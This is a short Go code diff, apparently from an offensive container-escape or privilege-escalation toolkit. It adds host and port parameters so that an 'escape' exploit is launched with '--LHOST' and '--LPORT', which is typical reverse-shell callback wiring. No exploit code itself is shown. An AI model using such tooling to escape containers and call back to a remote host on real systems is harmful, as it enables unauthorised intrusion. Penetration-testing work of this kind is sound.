@@ -32,8 +32,8 @@ func InvokeEscalate(primitive Primitive) error {
 	return cmd.Run()
 }
 
-func InvokeEscape(primitive Primitive) error {
-	cmd := reexec.Command(escapeExpName(primitive))
+func InvokeEscape(primitive Primitive, host, port string) error {
+	cmd := reexec.Command(escapeExpName(primitive), "--LHOST", host, "--LPORT", port)
 	cmd.Stderr = os.Stderr
 	cmd.Stdout = os.Stdout
 	cmd.Stdin = os.Stdin
